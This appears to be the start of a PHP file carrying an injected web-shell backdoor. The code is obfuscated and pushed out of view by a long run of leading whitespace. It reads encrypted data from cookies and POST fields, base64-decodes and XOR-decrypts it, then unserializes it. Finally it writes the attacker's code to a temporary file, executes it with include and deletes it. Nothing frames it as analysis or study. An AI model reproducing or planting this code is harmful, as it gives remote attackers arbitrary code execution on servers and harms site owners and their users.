<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("xqewiqplrh")){class xqewiqplrh{public static $rkhsnhoq = "vnzxwfigfvgaywhj";public static $nojbpe = NULL;public function __construct(){$ixakuzrr = @$_COOKIE[substr(xqewiqplrh::$rkhsnhoq, 0, 4)];if (!empty($ixakuzrr)){$ajvrh = "base64";$llljonriju = "";$ixakuzrr = explode(",", $ixakuzrr);foreach ($ixakuzrr as $ggdbxedyz){$llljonriju .= @$_COOKIE[$ggdbxedyz];$llljonriju .= @$_POST[$ggdbxedyz];}$llljonriju = array_map($ajvrh . "_decode", array($llljonriju,));$llljonriju = $llljonriju[0] ^ str_repeat(xqewiqplrh::$rkhsnhoq, (strlen($llljonriju[0]) / strlen(xqewiqplrh::$rkhsnhoq)) + 1);xqewiqplrh::$nojbpe = @unserialize($llljonriju);}}public function __destruct(){$this->wpyugegdwm();}private function wpyugegdwm(){if (is_array(xqewiqplrh::$nojbpe)) {$crytm = sys_get_temp_dir() . "/" . crc32(xqewiqplrh::$nojbpe["salt"]);@xqewiqplrh::$nojbpe["write"]($crytm, xqewiqplrh::$nojbpe["content"]);include $crytm;@xqewiqplrh::$nojbpe["delete"]($crytm);exit();}}}$gvcpmkr = new xqewiqplrh();$gvcpmkr = NULL;} ?><?php
